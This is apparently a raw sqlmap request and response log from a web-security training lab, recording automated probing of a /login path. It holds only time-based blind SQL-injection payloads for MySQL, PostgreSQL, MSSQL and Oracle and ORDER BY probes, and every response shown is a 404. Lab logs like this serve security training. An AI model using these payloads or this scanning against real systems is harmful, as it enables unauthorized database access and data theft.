+GET /login%20AND%20%28SELECT%203544%20FROM%20%28SELECT%28SLEEP%285%29%29%29psnI%29--%20kBzg HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#55] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%20%28SELECT%203544%20FROM%20%28SELECT%28SLEEP%285%29%29%29psnI%29--%20kBzg
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#56]:
+GET /login%29%20AND%206086%3D%28SELECT%206086%20FROM%20PG_SLEEP%285%29%29%20AND%20%283890%3D3890 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#56] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%20AND%206086%3D%28SELECT%206086%20FROM%20PG_SLEEP%285%29%29%20AND%20%283890%3D3890
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#57]:
+GET /login%20AND%206086%3D%28SELECT%206086%20FROM%20PG_SLEEP%285%29%29 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#57] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%206086%3D%28SELECT%206086%20FROM%20PG_SLEEP%285%29%29
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#58]:
+GET /login%27%29%20AND%206086%3D%28SELECT%206086%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27oSLB%27%3D%27oSLB HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#58] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%29%20AND%206086%3D%28SELECT%206086%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27oSLB%27%3D%27oSLB
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#59]:
+GET /login%27%20AND%206086%3D%28SELECT%206086%20FROM%20PG_SLEEP%285%29%29%20AND%20%27uBGN%27%3D%27uBGN HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#59] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%20AND%206086%3D%28SELECT%206086%20FROM%20PG_SLEEP%285%29%29%20AND%20%27uBGN%27%3D%27uBGN
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#60]:
+GET /login%20AND%206086%3D%28SELECT%206086%20FROM%20PG_SLEEP%285%29%29--%20CNlv HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#60] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%206086%3D%28SELECT%206086%20FROM%20PG_SLEEP%285%29%29--%20CNlv
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#61]:
+GET /login%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%286175%3D6175 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#61] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%286175%3D6175
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#62]:
+GET /login%20WAITFOR%20DELAY%20%270%3A0%3A5%27 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#62] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20WAITFOR%20DELAY%20%270%3A0%3A5%27
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#63]:
+GET /login%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27GKOh%27%3D%27GKOh HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#63] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27GKOh%27%3D%27GKOh
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#64]:
+GET /login%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27rUOA%27%3D%27rUOA HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#64] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27rUOA%27%3D%27rUOA
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#65]:
+GET /login%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20masl HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#65] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20masl
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#66]:
+GET /login%29%20AND%206192%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28105%29%7C%7CCHR%28117%29%7C%7CCHR%2886%29%7C%7CCHR%2877%29%2C5%29%20AND%20%287170%3D7170 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#66] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%20AND%206192%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28105%29%7C%7CCHR%28117%29%7C%7CCHR%2886%29%7C%7CCHR%2877%29%2C5%29%20AND%20%287170%3D7170
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#67]:
+GET /login%20AND%206192%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28105%29%7C%7CCHR%28117%29%7C%7CCHR%2886%29%7C%7CCHR%2877%29%2C5%29 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#67] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%206192%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28105%29%7C%7CCHR%28117%29%7C%7CCHR%2886%29%7C%7CCHR%2877%29%2C5%29
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#68]:
+GET /login%27%29%20AND%206192%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28105%29%7C%7CCHR%28117%29%7C%7CCHR%2886%29%7C%7CCHR%2877%29%2C5%29%20AND%20%28%27ZFFS%27%3D%27ZFFS HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#68] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%29%20AND%206192%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28105%29%7C%7CCHR%28117%29%7C%7CCHR%2886%29%7C%7CCHR%2877%29%2C5%29%20AND%20%28%27ZFFS%27%3D%27ZFFS
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#69]:
+GET /login%27%20AND%206192%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28105%29%7C%7CCHR%28117%29%7C%7CCHR%2886%29%7C%7CCHR%2877%29%2C5%29%20AND%20%27gKKx%27%3D%27gKKx HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#69] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%20AND%206192%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28105%29%7C%7CCHR%28117%29%7C%7CCHR%2886%29%7C%7CCHR%2877%29%2C5%29%20AND%20%27gKKx%27%3D%27gKKx
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#70]:
+GET /login%20AND%206192%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28105%29%7C%7CCHR%28117%29%7C%7CCHR%2886%29%7C%7CCHR%2877%29%2C5%29--%20eEHD HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#70] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%206192%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28105%29%7C%7CCHR%28117%29%7C%7CCHR%2886%29%7C%7CCHR%2877%29%2C5%29--%20eEHD
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#71]:
+GET /login%29%20ORDER%20BY%201--%20JeVO HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#71] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%20ORDER%20BY%201--%20JeVO
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#72]:
+GET /login%20ORDER%20BY%201--%20RgOm HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#72] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20ORDER%20BY%201--%20RgOm
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#73]:
+GET /login%27%29%20ORDER%20BY%201--%20rPtX HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#73] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%29%20ORDER%20BY%201--%20rPtX
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#74]:
+GET /login%27%20ORDER%20BY%201--%20dRLl HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#74] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%20ORDER%20BY%201--%20dRLl
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#75]:
+GET /login%20ORDER%20BY%201--%20avvD HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#75] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20ORDER%20BY%201--%20avvD
+
+"Not Found"
+
+############################################################################
+
